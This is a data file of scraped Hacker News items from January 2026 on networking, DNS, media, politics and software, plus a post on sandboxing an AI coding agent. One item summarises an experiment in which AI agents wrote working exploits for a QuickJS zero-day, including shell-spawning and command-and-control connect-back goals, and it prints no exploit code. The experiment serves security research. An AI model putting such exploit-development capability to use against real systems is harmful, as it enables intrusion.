{"title": "IP Addresses Through 2025", "url": "https://www.potaroo.net/ispcol/2026-01/addr2025.html", "content": "IP Addresses Through 2025. IP Addresses through 2025January 2026 It's time for another annual roundup from the world of IP addresses. Let’s see what has changed in the past 12 months in addressing the Internet and look at how IP address allocation information can inform us of the changing nature of the network itself. Back around 1992, the IETF gazed into their crystal ball and tried to understand how the Internet was going to evolve and what demands that would place on the addressing system as part of the “IP Next Generation” study.  The staggeringly large numbers of connected devices that we see today were certainly within the range predicted by that study. The assumption made at the time was that we would continue to use much the same IP protocol architecture, including the requirement that each connected device was assigned a unique IP address, and the implication was that the 32-bit address field defined in version 4 of the IP protocol was clearly going to be inadequate to cope with the predicted number of connected devices. A span of 4 billion address values was just not large enough. We concluded at the time that the only way we could make the Internet work across such a massive pool of connected devices was to deploy a new IP protocol that came with a massively larger address space. It was from this reasoning that IPv6 was designed, as this world of abundant silicon processors connected to a single public Internet was the scenario that IPv6 was primarily intended to solve. The copious volumes of a 128-bit address space were intended to allow us to uniquely assign a public IPv6 address to every such device, no matter how small, or in whatever volume they might be deployed. But while the Internet has grown at amazing speeds across the ensuing 33 years, the deployment of IPv6 has proceeded at a more measured pace. There is still no evidence of any common sense of urgency about the deployment of IPv6 in the public Internet, and still there is no common agreement that the continued reliance on IPv4 is failing us. Much of the reason for this apparent contradiction between the addressed device population of the IPv4 Internet and the actual count of connected devices, which is of course many times larger, is that through the 1990's the Internet rapidly changed from a peer-to-peer architecture to a client/server framework. Clients can initiate network transactions with servers but are incapable of initiating transactions with other clients. Servers are capable of completing connection requests from clients, but cannot initiate such connections with clients. Network Address Translators (NATs) are a natural fit to this client/server model, where pools of clients share a smaller pool of public addresses, and only require the use of an address once they have initiated an active session with a remote server. NATs are the reason why a pool of excess of 30 billion connected devices can be squeezed into a far smaller pool of some 3 billion advertised IPv4 addresses. Services and Applications that cannot work behind NATs are no longer useful in the context of the public Internet and no longer used as a result. In essence, what we did was to drop the notion that an IP address is uniquely associated with a device's identity, and the resultant ability to share addresses across clients largely alleviated the immediacy of the IPv4 addressing problem for the Internet. However, the pressures of this inexorable growth in the number of deployed devices connected to the Internet implies that the even NATs cannot absorb these growth pressures forever. NATs can extend the effective addressable space in IPv4 by up to 32 ‘extra’ bits using mapping of the 16-bit source and destination port fields of the TCP and UDP headers, and they also enable the time-based sharing of these public addresses. Both of these measures are effective in stretching the IPv4 address space to encompass a larger client device pool, but they do not transform the finite IP address space into an infinitely elastic resource. The inevitable outcome of this process, if it were to be constrained to operate solely within IPv4, is that we would see the fragmenting of the IPv4 Internet into a number of disconnected parts, probably based on the service ‘cones’ of the various points of presence of the content distribution servers, so that the entire concept of a globally unique and coherent address pool layered over a single coherent packet transmission realm would be foregone. Alternatively, we may see these growth pressures motivate the further deployment of IPv6, and the emergence of IPv6-only elements of the Internet as the network itself tries to maintain a cohesive and connected whole. There are commercial pressures pulling the network in both of these directions, so it’s entirely unclear what path the Internet will follow in the coming years, but my (admittedly cynical and perhaps overly jaded) personal opinion lies in a future of highly fragmented network, as least in terms of the underlying packet connectivity protocol. Can address allocation data help us to shed some light on what is happening in the larger Internet? Let’s look at what happened in 2025. It appears that the process of exhausting the remaining pools of unallocated IPv4 addresses is proving to be as protracted as the process of the transition to IPv6, although by the end of 2021 the end of the old registry allocation model had effectively occurred with the depletion of the residual pools of unallocated addresses in each of the Regional Internet Registries (RIRs).", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Danish pension fund divesting US Treasuries", "url": "https://www.reuters.com/business/danish-pension-fund-divest-its-us-treasuries-2026-01-20/", "content": "Danish pension fund divesting US Treasuries", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Zen of Reticulum", "url": "https://github.com/markqvist/Reticulum/blob/master/Zen%20of%20Reticulum.md", "content": "The Zen of Reticulum", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "I'm addicted to being useful", "url": "https://www.seangoedecke.com/addicted-to-being-useful/", "content": "I'm addicted to being useful. When I get together with my friends in the industry, I feel a little guilty about how much I love my job. This is atough timeto be a software engineer. The job was less stressful in the late 2010s than it is now, and I sympathize with anyone who is upset about the change. There are a lot of objective reasons to feel bad about work. But despite all that, I’m still having a blast. I enjoy pulling together projects, figuring out difficult bugs, and writing code in general. I like spending time with computers. But what I really love isbeing useful. The main character in Gogol’s short storyThe Overcoatis a man called Akaky Akaievich1. Akaky’s job is objectively terrible: he’s stuck in a dead-end copyist role, being paid very little, with colleagues who don’t respect him. Still, he loves his work, to the point that if he has no work to take home with him, he does some recreational copying just for his own sake. Akaky is a dysfunctional person. But his dysfunction makes him a perfect fit for his job2. It’s hard for me to see a problem and not solve it. This is especially true if I’m the only person (or one of a very few people) who could solve it, or if somebody is asking for my help. I feel an almost physical discomfort about it, and a corresponding relief and satisfaction when I do go and solve the problem. The work of a software engineer - or at least my work as a staff software engineer - is perfectly tailored to this tendency. Every day people rely on me to solve a series of technical problems3. In other words, like Akaky Akaievich, I don’t mind the ways in which my job is dysfunctional, because it matches the ways in which I myself am dysfunctional: specifically,my addiction to being useful. (Of course, it helps that my working conditions are overallmuchbetter than Akaky’s). I’m kind of like a working dog, in a way. Working dogs get rewarded with treats4, but they don’t do itforthe treats. They do it for the work itself, which is inherently satisfying. This isn’t true of all software engineers. But it’s certainly true of many I’ve met: if not an addiction to being useful, then they’re driven by an addiction to solving puzzles, or to the complete control over your work product that you only really get in software or mathematics. If they weren’t working as a software engineer, they would be getting really into Factorio, or crosswords, or tyrannically moderating some internet community. A lot of the advice I give about working a software engineering job is really about how I’ve shaped my need to be useful in a way that delivers material rewards, and how I try to avoid the pitfalls of such a need. For instance,Protecting your time from predators in large tech companiesis about how some people in tech companies will identify people like me and wring us out in ways that only benefit them.Crushing JIRA tickets is a party trick, not a path to impactis about how I need to be usefulto my management chain, not to the ticket queue.Trying to impress people you don’t respectis about how I cope with the fact that I’m compelled to be useful to some people who I may not respect or even like. There’s a lot of discussion on the internet about whatoughtto motivate software engineers: money and power, producing realvalue, ushering in the AI machine god, and so on. But whatactually doesmotivate software engineers is often more of an internal compulsion. If you’re in that category - as I suspect most of us are - then it’s worth figuring out how you can harness that compulsion most effectively. I think in Russian this is supposed to be an obviously silly name, like “Poop Poopson”. Unfortunately, his low status and low pay catches up with Akaky in the end. His financial difficulty acquiring a new coat for the cold Russian winter (and his lack of backbone) end up doing him in, at which point the story becomes a ghost story. I interpret “technical problem” quite broadly here: answering questions, explaining things, and bug-fixing all count.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Ocrbase – pdf → .md/.json document OCR and structured extraction API", "url": "https://github.com/majcheradam/ocrbase", "content": "Show HN: Ocrbase – pdf → .md/.json document OCR and structured extraction API", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Linux kernel framework for PCIe device emulation, in userspace", "url": "https://github.com/cakehonolulu/pciem", "content": "Linux kernel framework for PCIe device emulation, in userspace", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Running Claude Code dangerously (safely)", "url": "https://blog.emilburzo.com/2026/01/running-claude-code-dangerously-safely/", "content": "Running Claude Code dangerously (safely). I’ve been using Claude Code more and more recently. At some point I realized that rather than do something else until it finishes, I would constantly check on it to see if it was asking for yet another permission, which felt like it was missing the point of having an agent do stuff. So I wanted to use Claude Code with the--dangerously-skip-permissionsflag. If you haven’t used it, this flag does exactly what it says: it lets Claude Code do whatever it wants without asking permission first. No more “May I install this package?”, “Should I modify this config?”, “Can I delete these files?” It just… does it. Which is great for flow since I don’t have to worry that it stopped doing stuff just to ask a permission question. But also, you know, dangerous. I like my filesystem intact, so the obvious solution is to not run this thing directly on my OS account. First instinct: throw it in a Docker container. Containers are for isolation, right? Except I want Claude to be able to build Docker images. And run containers. And maybe orchestrate some stuff. So now you need Docker-in-Docker, which means--privilegedmode, which defeats the entire purpose of sandboxing. That means trading “Claude might mess up my filesystem” for “Claude has root-level access to my container runtime.” Not great.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Level S4 solar radiation event", "url": "https://www.swpc.noaa.gov/news/g4-severe-geomagnetic-storm-levels-reached-19-jan-2026", "content": "Level S4 solar radiation event. G4 Levels were first reached at 2:38pm EST (1938 UTC) on 19 January, 2026 upon CME shock arrival. CME passage is expected to continue through the evening with G4 levels remaining possible.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Martin Luther King was talking about a universal basic income before it was cool", "url": "https://www.businessinsider.com/martin-luther-king-jr-universal-basic-income-ai-economic-equality-2026-1", "content": "Martin Luther King was talking about a universal basic income before it was cool. Every time Lauren publishes a story, you’ll get an alert straight to your inbox! Enter your email  By clicking “Sign up”, you agree to receive emails from Business Insider. In addition, you accept Insider’sTerms of ServiceandPrivacy Policy. Billionaire tech bros likeSam AltmanandElon Musklike to think they operate on the futuristic fringe. On at least one subject that is trendy in tech circles, however, they are way late: basic income. Nearly six decades ago, Martin Luther King Jr. advocated for a form of basic income not unlike what AI leaders today suggest could be the salve tomitigate AI's impacton the workforce. King wrote in his 1967 book, \"Where Do We Go From Here?\" that a guaranteed annual income could ultimately create \"widespread economic security.\" \"Personal conflicts between husband, wife, and children will diminish when the unjust measurement of human worth on a scale of dollars is eliminated,\" he wrote. Every time Lauren publishes a story, you’ll get an alert straight to your inbox!", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "IP over Avian Carriers with Quality of Service (1999)", "url": "https://www.rfc-editor.org/rfc/rfc2549.html", "content": "IP over Avian Carriers with Quality of Service (1999)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Reticulum, a secure and anonymous mesh networking stack", "url": "https://github.com/markqvist/Reticulum", "content": "Reticulum, a secure and anonymous mesh networking stack", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Channel3 (YC S25) Is Hiring", "url": "https://www.ycombinator.com/companies/channel3/jobs/3DIAYYY-backend-engineer", "content": "Channel3 (YC S25) Is Hiring. Database of every product on the internet Channel3 is building a database of every product on the internet. People have wanted to do this for decades, but it wasn’t possible until now – AI is finally smart enough to structure the world’s messy product data, and inexpensive enough to do so at scale. We believe agentic commerce is as important as in-store and online channels; that’s where “Channel3” comes from. We plan to become the central node of agentic commerce, powering every AI transaction and taking a cut of GMV. We see Channel3 becoming as foundational to AI commerce as Stripe is to payments or Plaid is to fintech. Agentic commerce is bottlenecked by messy product data. (See“OpenAI’s Shopping Ambitions Hit Messy Data Reality”) Product data is inconsistent at best, completely wrong at worst — that is, if it exists at all. McKinsey estimatesthat “by 2030, the US B2C retail market alone could see up to $1 trillion in orchestrated revenue from agentic commerce, with global projections reaching as high as $3 trillion to $5 trillion.” That future is impossible without great product data. Alex(CEO) andGeorge(CTO) have been friends since the first day of Duke. Alex began coding at 9, started his first company at 12, and most recently led AI projects atstudio.com, where he got this idea. George published research on automating astronomy with robots at 18, and worked on big-data problems at Palantir for the past 2 years. EvanandIgnacioare our founding engineers, both joining us from AWS. Evan earned a Masters in CS at Penn andbuilt the first working example of agentic commerce. Ignacio studied CS at Duke with Alex + George and worked on agentic commerce at AWS. Our team is all engineers; we shipfast. Unfortunately, we are not able to sponsor visas at this time. You must have authorization to work in the US. We raised a $6M seed round in August 2025, led byMatrix(Apple, FedEx, Afterpay, Oculus) with participation fromLudlow(Honey, StockX), Y Combinator, Paul Graham, a16z + Index scouts, and a couple dozen angels (mostly ex-YC founders).", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Apple testing new App Store design that blurs the line between ads and results", "url": "https://9to5mac.com/2026/01/16/iphone-apple-app-store-search-results-ads-new-design/", "content": "Apple testing new App Store design that blurs the line between ads and results. Apple is testing a new design for App Store search ads on iPhone. Some users on iOS 26.3 are noticing that the blue background around sponsored results is no longer shown, blurring the line between what paid ad results look like and the real search results that follow. This means the only differentiator between organic results and the promoted ad is the presence of the small ‘Ad’ banner next to the app icon. Right now, it appears to be in some kind of A/B test phase. We have asked Apple for clarity on the change, and whether this will roll out more widely in the future. It may be related to thecompany’s announcement from Decemberthat App Store search results will soon start including more than one sponsored result for a given search query. The removal of the blue background will mean all of the ads will appear in the list in a more integrated fashion. Of course, this also has the effect of making it harder for users to quickly distinguish at a glance what is an ad and what isn’t, potentially misleading some users into not realising that the first result is a paid ad placement. While not great for user experience, it probably helps increase click-through rates which ultimately boosts Apple’s revenue in its ads business. FTC: We use income earning auto affiliate links.More. Check out 9to5Mac on YouTube for more Apple news: Benjamin develops iOS apps professionally and covers Apple news and rumors for 9to5Mac. Listen to Benjamin, every week, on the Happy Hour podcast. Check outhis personal blog. Message Benjamin overemailorTwitter. The easiest way to get into HomeKit and Apple smart home tech. Great for gifts. Inexpensive, fast, wireless charger for iPhone.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Benchmarking a Baseline Fully-in-Place Functional Language Compiler [pdf]", "url": "https://trendsfp.github.io/papers/tfp26-paper-12.pdf", "content": "Benchmarking a Baseline Fully-in-Place Functional Language Compiler [pdf]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Increasing the performance of WebAssembly Text Format parser by 350%", "url": "https://blog.gplane.win/posts/improve-wat-parser-perf.html", "content": "Increasing the performance of WebAssembly Text Format parser by 350%. The WAT (WebAssembly Text Format) parser inwasm-language-toolsv0.5 or before was not fast enough. Recently I have rewritten the parser from scratch, and the performance has been increased by 350% in the benchmark.Let me share how I optimized it. The old parser was written withwinnowwhich is a parser combinator library.While it’s easy to create a parser with parser combinators, it’s generally slower than a hand-written parser,so the first step is to write the parser by hands. Hand-written parser is not only faster but also allows to do more optimizations in the future. There’re many parentheses and keywords in WAT. For these tokens and nodes, they shouldn’t be created again and again when parsing.Looking into the implementation ofrowan::GreenTokenandrowan::GreenNode, there’s aArcinside,so we can prepare these well-known tokens and nodes in advance, then put them intoLazyLockone by one, and clone them when needed. There’re many keywords in WAT such asmodule,func,param,result, etc.When recognizing keywords in lexer, we don’t capture a word and then check it by comparing strings. Instead, we check the prefix of source code in bytes: However, there may be a word likefunctionthat starts withfuncbut it isn’t a keyword, so we must check the next character is not an identifier character. Except strings and comments, other kinds of tokens are just ASCII strings.For these tokens, we can useget_uncheckedto avoid unnecessary UTF-8 boundary check whichgetwill do. The lexer will produce tokens in our ownTokentype instead ofrowan::GreenToken,because creatingrowan::GreenTokenis much more expensive, and we should create it only when needed. TheTokentype is simple as below: For convenience, I addedimpl From<Token<'_>> for rowan::NodeOrToken<rowan::GreenNode, rowan::GreenToken>.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "What came first: the CNAME or the A record?", "url": "https://blog.cloudflare.com/cname-a-record-order-dns-standards/", "content": "What came first: the CNAME or the A record?. 2026-01-14 On January 8, 2026, a routine update to 1.1.1.1 aimed at reducing memory usage accidentally triggered a wave of DNS resolution failures for users across the Internet. The root cause wasn't an attack or an outage, but a subtle shift in the order of records within our DNS responses. While most modern software treats the order of records in DNS responses as irrelevant, we discovered that some implementations expect CNAME records to appear before everything else. When that order changed, resolution started failing. This post explores the code change that caused the shift, why it broke specific DNS clients, and the 40-year-old protocol ambiguity that makes the \"correct\" order of a DNS response difficult to define. All timestamps referenced are in Coordinated Universal Time (UTC). Time Description 2025-12-02 The record reordering is introduced to the 1.1.1.1 codebase 2025-12-10 The change is released to our testing environment", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Nanolang: A tiny experimental language designed to be targeted by coding LLMs", "url": "https://github.com/jordanhubbard/nanolang", "content": "Nanolang: A tiny experimental language designed to be targeted by coding LLMs", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Overcomplexity of the Shadcn Radio Button", "url": "https://paulmakeswebsites.com/writing/shadcn-radio-button/", "content": "The Overcomplexity of the Shadcn Radio Button. The other day I was asked to update the visual design of radio buttons in a web\napp at work. I figured it couldn't be that complicated. It's just a radio button\nright? Boom! Done. Radio buttons are a built-in HTML element. They've been around for\n30 years. The browser makes it easy. Time for a coffee. I dug into our codebase and realized we were using two React components fromShadcnto power our radio buttons:<RadioGroup>and<RadioGroupItem>. For those unfamiliar with Shadcn, it's a UI framework that provides a bunch of\nprebuilt UI components for use in your websites. Unlike traditional UI\nframeworks like Bootstrap, you don't import it with a script tag ornpm install. Instead you run a command that copies the components into your\ncodebase. Here's the code that was exported from Shadcn into our project: Woof... 3 imports and 45 lines of code. And it's importing a third party icon\nlibrary just to render a circle. (Who needs CSSborder-radiusor the SVG<circle>element when you can add a third party dependency instead?) All of the styling is done by the 30 different Tailwind classes in the markup. I\nshould probably just tweak those to fix the styling issues. But now I'm distracted, annoyed, and curious. Where's the actual<input>?\nWhat's the point of all this? Let's dig a little deeper. The Shadcn components import components from another library called Radix. For\nthose unfamiliar with Radix, it's a UI framework that provides a bunch of\nprebuilt UI components... Wait a second! Isn't that what I just said about Shadcn? What gives? Why do we\nneed both? Let's see what the Radix docs say:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The coming industrialisation of exploit generation with LLMs", "url": "https://sean.heelan.io/2026/01/18/on-the-coming-industrialisation-of-exploit-generation-with-llms/", "content": "The coming industrialisation of exploit generation with LLMs. Recently I ran an experiment where I built agents on top of Opus 4.5 and GPT-5.2 and then challenged them to write exploits for a zeroday vulnerability in the QuickJS Javascript interpreter. I added a variety of modern exploit mitigations, various constraints (like assuming an unknown heap starting state, or forbidding hardcoded offsets in the exploits) and different objectives (spawn a shell, write a file, connect back to a command and control server). The agents succeeded in building over 40 distinct exploits across 6 different scenarios, and GPT-5.2 solved every scenario. Opus 4.5 solved all but two. I’ve put a technical write-up of the experiments and the results onGithub, as well as the code to reproduce the experiments. In this post I’m going to focus on the main conclusion I’ve drawn from this work, which is that we should prepare for the industrialisation of many of the constituent parts of offensive cyber security. We should start assuming that in the near future the limiting factor on a state or group’s ability to develop exploits, break into networks, escalate privileges and remain in those networks, is going to be their token throughput over time, and not the number of hackers they employ. Nothing is certain, but we would be better off having wasted effort thinking through this scenario and have it not happen, than be unprepared if it does. A Brief Overview of the Experiment All of the code to re-run the experiments, a detailed write-up of them, and the raw data the agents produced are onGithub, but just to give a flavour of what the agents accomplished: Before going on there are two important caveats that need to be kept in mind with these experiments: The Industrialisation of Intrusion By ‘industrialisation’ I mean that the ability of an organisation to complete a task will be limited by the number of tokens they can throw at that task. In order for a task to be ‘industrialised’ in this way it needs two things: Exploit development is the ideal case for industrialisation. An environment is easy to construct, the tools required to help solve it are well understood, and verification is straightforward. I have written up the verification process I used for the experimentshere, but the summary is: an exploit tends to involve building a capability to allow you to do something you shouldn’t be able to do. If, after running the exploit, you can do that thing, then you’ve won. For example, some of the experiments involved writing an exploit to spawn a shell from the Javascript process. To verify this the verification harness starts a listener on a particular local port, runs the Javascript interpreter and then pipes a command into it to run a command line utility that connects to that local port. As the Javascript interpreter has no ability to do any sort of network connections, or spawning of another process in normal execution, you know that if you receive the connect back then the exploit works as the shell that it started has run the command line utility you sent to it. There is a third attribute of problems in this space that may influence how/when they are industrialisable: if an agent can solve a problem in an offline setting and then use its solution,  then it maps to the sort of large scale solution search that models seem to be good at today. If offline search isn’t feasible, and the agent needs to find a solution while interacting with the real environment, andthat environment has the attribute that certain actions by the agent permanently terminate the search, then industrialisation may be more difficult. Or, at least, it’s less apparent that the capabilities of current LLMs map directly to problems with this attribute. There are several tasks involved in cyber intrusions that have this third property: initial access via exploitation, lateral movement, maintaining access, and the use of access to do espionage (i.e. exfiltrate data). You can’t perform the entire search ahead of time and then use the solution. Some amount of search has to take place in the real environment, and that environment is adversarial in that if a wrong action is taken it can terminate the entire search. i.e. the agent is detected and kicked out of the network, and potentially the entire operation is burned. For these tasks I think my current experiments provide less information. They are fundamentally not about trading tokens for search space coverage. That said, if we think we can build models for automating coding and SRE work, then it would seem unusual to think that these sorts of hacking-related tasks are going to be impossible.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Scaling long-running autonomous coding", "url": "https://simonwillison.net/2026/Jan/19/scaling-long-running-autonomous-coding/", "content": "Scaling long-running autonomous coding. Scaling long-running autonomous coding. Wilson Lin at Cursor has been doing some experiments to see how far you can push a large fleet of \"autonomous\" coding agents: This post describes what we've learned from running hundreds of concurrent agents on a single project, coordinating their work, and watching them write over a million lines of code and trillions of tokens. They ended up running planners and sub-planners to create tasks, then having workers execute on those tasks - similar to how Claude Code uses sub-agents. Each cycle ended with a judge agent deciding if the project was completed or not. In my predictions for 2026the other dayI said that by 2029: I think somebody will have built a full web browser mostly using AI assistance, and it won’t even be surprising. Rolling a new web browser is one of the most complicated software projects I can imagine[...] the cheat code is the conformance suites. If there are existing tests that it’ll get so much easier. I may have been off by three years, because Cursor chose \"building a web browser from scratch\" as their test case for their agent swarm approach: To test this system, we pointed it at an ambitious goal: building a web browser from scratch. The agents ran for close to a week, writing over 1 million lines of code across 1,000 files. You can explorethe source code on GitHub. But how well did they do? Their initial announcement a couple of days ago was met withunsurprising skepticism, especially when it became apparent that their GitHub Actions CI was failing and there were no build instructions in the repo. It looks like they addressed that within the past 24 hours. Thelatest READMEincludes build instructions which I followed on macOS like this: This got me a working browser window! Here are screenshots I took of google.com and my own website:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "3D printing my laptop ergonomic setup", "url": "https://www.ntietz.com/blog/3d-printing-my-laptop-ergonomic-setup/", "content": "3D printing my laptop ergonomic setup. Monday, January 19, 2026 Apparently, one of my hobbies is making updates to my ergonomic setup, then blogging about it from an Amtrak train. I've gone and done it again. My setup stayed static for some time, but mymost recent iterationended up letting me down and I had to change it again. It gave me a lot of useful information and strongly shaped how I approached this iteration. This new one is closest to thefirst one I wrote aboutin 2024, but with some major improvements and reproducibility. First things first, though. Why am making I yet more changes to this setup? Besides my constant neurodivergent drive to make things perfect, my setups all kept causing me some problems. In chronological order, here are the problems and neat benefits of each setup I used for at least a few months. So my immediate previous version was heavy and tedious to setup. I had a trip coming up to Brooklyn, so I had to either make something more portable or leave my laptop at home. I decided to take my laptop, and did a design sprint to see if I can make my dream setup. At this point I'll probably be working on this setup forever, but I hope I can stop if I am able to satisfy all my goals at some point. My dream setup has these characteristics: So, you know, it's not like I want a lot out of this setup. It's not like these are kind of a lot to all fit into one thing. I'm sure it'll be a piece of cake. I useOpenSCADfor 3D modeling. It's pretty pleasant, though some things are hard in general (like roundovers and fillets on any more complicated shapes). My design to start is basically one of my previous versions: my split keyboard at adjustable width on a base, and a slot to hold my laptop vertically. I started by measuring important dimensions, like how far apart I wanted my keyboard halves and the dimensions of my laptop. Then I compared these to my 3D printer's print volume, and started working out how I'd have to print it. The rig is wider than my 3D printer, so I had to split it up into parts. The slot would fit as a separate piece if I oriented it diagonally. The base itself would have to be split into two separate halves.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Notes on Apple's Nano Texture (2025)", "url": "https://jon.bo/posts/nano-texture/", "content": "Notes on Apple's Nano Texture (2025). TLDR: the Nano Texture performs wonderfully anywhere where light used to be a factor and used to force me to shade my screen or avoid the place entirely. Big thanks toJulie Krugerfor the comparison photos andCJfor draft feedback. A few months after I got the Daylight Computer (read my thoughts here), two friends sent methis postcomparing the old Macbook Pro displays to the new Nano Texture glass ones. That post convinced me to upgrade my computer in short order, to the dismay of my wallet. In the four months I’ve had it I’ve told at least a dozen people about it, and I’m gonna keep telling people. Being able to take my entire computing environment to places without being worried about glare has expanded the range of environments I can create in. It means I get to be in environments that are more interesting, fun, and in tune with my body. What follows are some thoughts about how this display has fit into my day to day life in the couple of months I’ve had it. Typical matt displays have a coating added to their surface that scatters light. However, these coatings lower contrast while producing unwanted haze and sparkle. Etched into the glass at the nanometre level, the nano-texture scatters light to further minimise glare — for outstanding image quality even in challenging lighting conditions. https://www.apple.com/uk/shop/buy-mac/apple-studio-display/nano-texture-glass-tilt-adjustable-stand Basically, it’s a coating physically etched into the screen that reflects light differently from the glossy finish of the traditional screen. First off, this isn’t apples to oranges - these are different technologies that in my mind, serve a different purpose. The Daylight Computer is an Android tablet, the Macbook Pro is a full MacOS laptop. The transflective LCD in the Daylight Computer is grayscale but it needs no light to function. It has a backlight, but where it does really well is in direct sunlight with the backlight turned off. When outside in direct sunlight, toggling the Daylight’s backlight on and off doesn’t make a difference because it works fundamentally different from a laptop screen.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "x86 prefixes and escape opcodes flowchart", "url": "https://soc.me/interfaces/x86-prefixes-and-escape-opcodes-flowchart.html", "content": "x86 prefixes and escape opcodes flowchart", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Prediction markets are ushering in a world in which news becomes about gambling", "url": "https://www.theatlantic.com/technology/2026/01/america-polymarket-disaster/685662/", "content": "Prediction markets are ushering in a world in which news becomes about gambling. For the past week, I’ve found myself playing the same23-second CNN clipon repeat. I’ve watched it in bed, during my commute to work, at the office, midway through making carrot soup, and while brushing my teeth. In the video, Harry Enten, the network’s chief data analyst, stares into the camera and breathlessly tells his audience about the gambling odds that Donald Trump will buy any of Greenland. “The people who are putting their money where their mouth is—they are absolutely taking this seriously,” Enten says. He taps the giant touch screen behind him and pulls up a made-for-TV graphic: Based on how people were betting online at the time, there was a 36 percent chance that the president would annex Greenland. “Whoa, way up there!” Enten yells, slapping his hands together. “My goodness gracious!” The ticker at the bottom of the screen speeds through other odds: Will Gavin Newsom win the next presidential election? 19 percent chance. Will Viktor Orbán be out as the leader of Hungary before the end of the year? 48 percent chance.  These odds were pulled from Kalshi, which hilariouslyclaimsnot to be a gambling platform: It’s a “prediction market.” People go to sites such as Kalshi and Polymarket—another big prediction market—in order to put money down on a given news event. Nobody would bet on something that they didn’t believe would happen, the thinking goes, and so the markets are meant to forecast the likelihood of a given outcome. Listen: Prediction markets and the “suckerification” crisis, with Max Read Prediction markets let you wager on basically anything. Will Elon Musk fatheranother babyby June 30? WillJesus returnthis year? Will Israelstrike Gaza tomorrow? Will thelongevity guruBryan Johnson’s next functional sperm count be greater than “20.0 M/ejac”? These sites have recently boomed in popularity—particularly amongterminally online young menwho trade meme stocks and siphon from their 401(k)s to buy up bitcoin. But now prediction markets are creeping into the mainstream. CNNannounced a dealwith Kalshi last month to integrate the site’s data into its broadcasts, which has led to betting odds showing up in segments about Democrats possibly retaking the House, credit-card interest rates, and Federal Reserve Chair Jerome Powell. At least twice in the past two weeks, Enten has told viewers about the value of data from people who are “putting their money where their mouth is.”  On January 7, the media giant Dow Jones announced its own collaboration with Polymarket and said that it will begin integrating the site’s odds across its publications, includingThe Wall Street Journal. CNBC has a prediction-market deal, as does Yahoo Finance,Sports Illustrated, andTime. Last week, MoviePassannouncedthat it will begin testing a betting platform. On Sunday, the Golden Globes featured Polymarket’s forecasts throughout the broadcast—because apparently Americans wanted to know whether online gamblers favored Amy Poehler or Dax Shepard to win Best Podcast.  Media is a ruthless, unstable business, andrevenue streams are drying up; if you squint, you can see why CNN or Dow Jones mightsign a contractthat, after all, provides its audience with some kind of data. On air, Enten cites Kalshi odds alongside Gallup polls and Google searches—what’s the difference? “The data featured through our partnership with Kalshi is just one of many sources used to provide context around the stories or topics we are covering and has no impact on editorial judgment,” Brian Poliakoff, a CNN spokesperson, told me in a statement. Nolly Evans, theJournal’s digital general manager, told me that Polymarket provides the newspaper’s journalists with “another way to quantify collective expectations—especially around financial or geopolitical events.” In an email, Jack Suh, a Kalshi spokesperson, told me that the company’s partnerships are designed to inform the public, not to encourage more trading. Polymarket declined to comment. ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "It's Sundowning in America", "url": "https://paulkrugman.substack.com/p/its-sundowning-in-america", "content": "It's Sundowning in America.  A short post. Today doesn’t seem like a day for charts and number-crunching. I had never heard the term “sundowning” before it happened to my own father, yet it’s a fairly common syndrome. In his last few months my father remained lucid and rational — remained himself — during daylight hours. Once the sun went down he deteriorated, becoming confused, paranoid and aggressive. It’s terrible to watch sundowning in someone you love. But that’s a personal tragedy – not a national or global one. It’s an entirely different matter when the president of the United States is sundowning — a president surrounded by malign sycophants who tell him whatever he wants to hear and indulge his every whim, no matter how destructive. For good reasons, it’s normally bad practice to pronounce on someone’s mental health from afar. Some of us still remember when right-wing pundits liked to call anyone critical of George W. Bushmentally ill. But after reading theletterthat Trump just sent to the prime minister of Norway (Jonas Gahr Størehas confirmed that it’s genuine) there should be no doubt that we have a president who is suffering a real detachment from reality: Dear Jonas: Considering your Country decided not to give me the Nobel Peace Prize for having stopped 8 Wars PLUS, I no longer feel an obligation to think purely of Peace, although it will always be predominant, but can now think about what is good and proper for the United States of America. Denmark cannot protect that land from Russia or China, and why do they have a ‘right of ownership’ anyway? There are no written documents, it’s only that a boat landed there hundreds of years ago, but we had boats landing there, also. I have done more for NATO than any other person since its founding, and now, NATO should do something for the United States. The World is not secure unless we have Complete and Total Control of Greenland. Thank you! President DJT This might not exactly be sundowning, since it’s not clear that Trump is lucid and rational at any time of the day. What is incontrovertible is that he’s deeply unwell and rapidly getting sicker. In fact, Trump is so deeply unwell that it’s time to stop blaming him for all the terrible things he’s doing. He is what he is. Responsibility for the catastrophe overtaking America now rests with his enablers — people who have to know that he’s a sick man but continue to support his depredations.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Nuudel: Non-Tracking Appointment Tool", "url": "https://nuudel.digitalcourage.de/", "content": "Nuudel: Non-Tracking Appointment Tool. Termin finden Klassische Umfrage Wo sind meine Umfragen? Dieser Dienst wird vom gemeinnützigen Digitalcourage e.V. für Sie kostenlos angeboten. Unterstützen Sie den Betrieb und unsere Arbeit für eine lebenswerte Welt im digitalen Zeitalter alsFördermitglied! Digitalcourage:Newsletter|Spenden|English information", "source": "HackerNews", "date": null, "author": null, "score": null}
